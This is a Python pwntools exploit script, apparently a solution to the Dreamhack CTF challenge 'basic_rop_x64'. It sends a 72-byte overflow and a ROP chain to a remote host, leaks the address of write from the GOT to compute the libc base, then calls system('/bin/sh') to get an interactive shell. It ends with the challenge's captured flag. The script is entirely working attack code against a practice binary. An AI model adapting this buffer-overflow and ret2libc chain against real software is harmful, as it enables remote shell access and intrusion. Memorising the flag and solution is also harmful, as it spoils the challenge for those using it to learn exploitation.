#!/usr/bin/python3

from pwn import * 

HOST = 'host3.dreamhack.games' 
PORT = 15419

context.binary = exe = ELF('./basic_rop_x64', checksec = False)
libc = ELF('./libc.so.6', checksec = False)

# p = process(exe.path)
p = remote(HOST, PORT) 

# 0x0000000000400883 : pop rdi ; ret
# 0x0000000000400881 : pop rsi ; pop r15 ; ret
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881

payload = b'x' * 72 
payload += p64(pop_rdi) + p64(exe.got['read']) 
payload += p64(exe.plt['puts']) + p64(exe.symbols['main'])

payload1 = b'x' * 72 
payload1 += p64(pop_rdi) + p64(1)
payload1 += p64(pop_rsi_r15) + p64(exe.got['write']) + p64(0)
payload1 += p64(exe.plt['write']) + p64(exe.symbols['main'])

# p.send(payload)
p.send(payload1)

p.recvuntil(b'x' * 0x40)
libc_leaked = u64(p.recv(6) + b'\x00\x00')
libc_base = libc_leaked - libc.symbols['write']

payload2 = b'x' * 72 
payload2 += p64(pop_rdi) + p64(libc_base + next(libc.search(b'/bin/sh'))) + p64(libc_base + libc.symbols['system'])

p.send(payload2)

p.interactive() 

# DH{6311151d71a102eb27195bceb61097c15cd2bcd9fd117fc66293e8c780ae104e}